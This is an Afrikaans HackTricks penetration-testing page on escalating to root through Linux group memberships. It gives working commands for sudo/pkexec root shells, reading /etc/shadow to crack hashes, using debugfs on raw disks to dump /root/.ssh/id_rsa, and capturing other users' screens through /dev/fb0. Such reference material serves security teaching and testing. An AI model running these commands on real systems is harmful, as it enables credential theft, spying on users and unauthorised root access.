<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>


# Sudo/Admin Groepe

## **PE - Metode 1**

**Soms**, **standaard \(of omdat sommige sagteware dit nodig het\)** binne die **/etc/sudoers** lêer kan jy van hierdie lyne vind:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Dit beteken dat **enige gebruiker wat behoort tot die groep sudo of admin enigiets as sudo kan uitvoer**.

Indien dit die geval is, kan jy **root word deur net die volgende uit te voer**:
```text
sudo su
```
## PE - Metode 2

Vind alle suid-binêre en kyk of die binêre **Pkexec** daar is:
```bash
find / -perm -4000 2>/dev/null
```
As jy vind dat die binaêre pkexec 'n SUID-binaêre is en jy behoort aan sudo of admin, kan jy waarskynlik binaêre lêers uitvoer as sudo deur pkexec te gebruik.
Kyk na die inhoud van:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Daar sal jy vind watter groepe toegelaat word om **pkexec** uit te voer en **standaard** in sommige Linux kan sommige van die groepe **sudo of admin** voorkom.

Om **root te word kan jy uitvoer**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
As jy probeer om **pkexec** uit te voer en jy kry hierdie **fout**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Dit is nie omdat jy nie toestemmings het nie, maar omdat jy nie sonder 'n GUI aangesluit is nie**. En daar is 'n oplossing vir hierdie probleem hier: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Jy benodig **2 verskillende ssh-sessies**:

{% code title="sessie1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% code title="sessie2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

# Wielgroep

**Soms**, **standaard** binne die **/etc/sudoers** lêer kan jy hierdie lyn vind:
```text
%wheel	ALL=(ALL:ALL) ALL
```
Dit beteken dat **enige gebruiker wat behoort tot die groep wheel enigiets as sudo kan uitvoer**.

As dit die geval is, kan jy **root word deur net uit te voer**:
```text
sudo su
```
# Skadugroep

Gebruikers van die **skadugroep** kan die **/etc/shadow**-lêer **lees**:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, lees die lêer en probeer om **sommige hashe te kraak**.

# Skyf Groep

Hierdie voorreg is amper **gelykwaardig aan root-toegang** aangesien jy toegang het tot alle data binne-in die masjien.

Lêers: `/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Let daarop dat jy met behulp van debugfs ook **lêers kan skryf**. Byvoorbeeld, om `/tmp/asd1.txt` na `/tmp/asd2.txt` te kopieer, kan jy die volgende doen:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Egter, as jy probeer om lêers wat deur root besit word te skryf (soos `/etc/shadow` of `/etc/passwd`), sal jy 'n "Toestemming geweier" fout kry.

# Video Groep

Met die opdrag `w` kan jy **sien wie op die stelsel aangemeld is** en dit sal 'n uitset soos die volgende een toon:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Die **tty1** beteken dat die gebruiker **yossi fisies ingeteken** is op 'n terminaal op die masjien.

Die **video groep** het toegang om die skermuitset te sien. Jy kan basies die skerms waarneem. Om dit te doen, moet jy die huidige beeld op die skerm in rou data vasvang en die resolusie kry wat die skerm gebruik. Die skerminligting kan gestoor word in `/dev/fb0` en jy kan die resolusie van hierdie skerm vind in `/sys/class/graphics/fb0/virtual_size`.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Om die **rou beeld** oop te maak, kan jy **GIMP** gebruik, kies die **`screen.raw`** lêer en kies as lêertipe **Rou beelddata**:

![](../../.gitbook/assets/image%20%28208%29.png)

Wysig dan die Breedte en Hoogte na die waardes wat op die skerm gebruik word en kyk na verskillende Beeldtipes \(en kies die een wat die skerm beter wys\):

![](../../.gitbook/assets/image%20%28295%29.png)

# Root Groep

Dit lyk asof **lede van die root groep** standaard toegang kan hê om sekere **dienskonfigurasie-lêers** of sekere **biblioteeklêers** of **ander interessante dinge** te wysig wat gebruik kan word om voorregte te verhoog...

**Kyk watter lêers root-lede kan wysig**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Docker Groep

Jy kan die wortel lêerstelsel van die gasheer rekenaar aan 'n instansie se volume koppel, sodat wanneer die instansie begin, dit onmiddellik 'n `chroot` in daardie volume laai. Dit gee jou effektief beheer oor die rekenaar.

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# lxc/lxd Groep

[lxc - Bevoorregte Eskalasie](lxd-privilege-escalation.md)



<details>

<summary><strong>Leer AWS hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
